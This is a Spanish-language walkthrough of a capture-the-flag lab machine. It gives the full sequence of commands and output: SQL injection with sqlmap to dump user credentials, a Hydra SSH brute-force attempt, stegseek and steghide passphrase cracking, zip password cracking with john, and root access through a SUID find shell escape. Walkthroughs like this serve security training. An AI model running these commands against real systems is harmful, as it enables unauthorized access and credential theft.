PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos a la web y vemos un login, probamos SQLI y funciona

-Usamos Sqlmap para extraer toda la información de la BBDD
	-sqlmap -u http://mirame/ --dbs --batch --forms
		[*] information_schema
		[*] users
	-sqlmap -u http://mirame/ -D users --tables --batch --forms
		Database: users
		[1 table]
		+----------+
		| usuarios |
		+----------+
	-sqlmap -u http://mirame/ -D users -T usuarios --columns --batch --forms
		Database: users
		Table: usuarios
		[3 columns]
		+----------+--------------+
		| Column   | Type         |
		+----------+--------------+
		| id       | int(11)      |
		| password | varchar(255) |
		| username | varchar(50)  |
		+----------+--------------+
	-sqlmap -u http://mirame/ -D users -T usuarios -C username,password --dump --batch --forms 
		+------------+------------------------+
		| username   | password               |
		+------------+------------------------+
		| admin      | chocolateadministrador |
		| directorio | directoriotravieso     |
		| lucas      | lucas                  |
		| agustin    | soyagustin123          |
		+------------+------------------------+

-Hacemos fuerza bruta con Hydra  a SSH con las credenciales obtenidas pero no funciona

-Vemos que en las contraseñas hay una curiosa --> 'directoriotravieso'

-Nos vamos a /mirame/directoriotravieso en la URL y vemos una imagen, nos la descargamos:
	-wget http://mirame/directoriotravieso/miramebien.jpg 

-Intentamos aplicar estenografía pero nos pida una 'passphrase'

-Usamos la Herramienta stegseek, que sirve para encontrar la 'passphrase' en una imagen:
	-stegseek miramebien.jpg 
		[i] Found passphrase: "chocolate"
		[i] Original filename: "ocultito.zip".

-Ahora si usamos steghide con la 'passphrase' obtenida:
	-steghide --extract -sf miramebien.jpg
	Enter passphrase: chocolate

-Se nos crea un archivo.zip, el cual nos pide contraseña. Usamos zip2john y john:
	-zip2john ocultito.zip > hash.txt
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
	stupid1          (ocultito.zip/secret.txt)   

-Nos crea un archivo secret.txt con credenciales para ssh:
	-ssh carlos@172.17.0.2
	password: carlitos
	carlos@45c4fdbed220:~$

## Escalada de Privilegios

-Buscamos permisos SUID:
	/usr/bin/find

-Abusamos del binario:
	carlos@45c4fdbed220:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
	# whoami
	root

